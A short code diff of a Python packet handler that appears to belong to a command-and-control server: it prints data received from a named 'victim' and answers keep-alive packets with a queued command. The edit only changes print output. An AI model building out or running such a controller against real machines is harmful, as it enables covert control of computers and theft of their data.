@@ -45,12 +45,12 @@ def handle_load(load, path, sender_ip):
     if("d" in deserialized_load.keys()):
         # print(f"\ndata packet from {victim_name}[{sender_ip}] received")
         # print(f"data received: {deserialized_load['d']}")
-        print(deserialized_load["d"])
+        print(deserialized_load["d"], end="")
 
     else:
         print(f"\nkeep-alive packet from {victim_name}[{sender_ip}] received")
         command = get_victim_command(victim_name, path)
-        print(f"sent command: {command}")
+        # print(f"sent command: {command}")
         return command
 
     return ""
